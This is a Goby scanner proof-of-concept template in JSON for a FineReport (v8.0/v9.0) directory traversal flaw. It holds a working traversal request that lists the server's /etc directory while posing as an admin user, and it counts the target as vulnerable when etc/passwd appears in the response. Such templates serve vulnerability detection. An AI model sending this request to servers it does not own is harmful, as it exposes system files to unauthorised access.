{
      "Name": "FineReport（帆软）报表系统目录遍历漏洞",
      "Level": "1",
      "Tags": [],
      "GobyQuery": "body=\"/WebReport/ReportServer\"",
      "Description": "漏洞影响\nFineReport v8.0\nFineReport v9.0",
      "Product": "FineReport（帆软）报表系统",
      "Homepage": "https://gobies.org/",
      "Author": "luckying",
      "Impact": "",
      "Recommandation": "<p>undefined</p>",
      "References": [
            "https://gobies.org/"
      ],
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../../../../../../../../../../../../etc&currentUserName=admin&currentUserId=1&isWebReport=true",
                        "follow_redirect": false,
                        "header": {},
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "etc/passwd",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "PostTime": "2021-06-12 22:55:02",
      "GobyVersion": "1.8.268"
}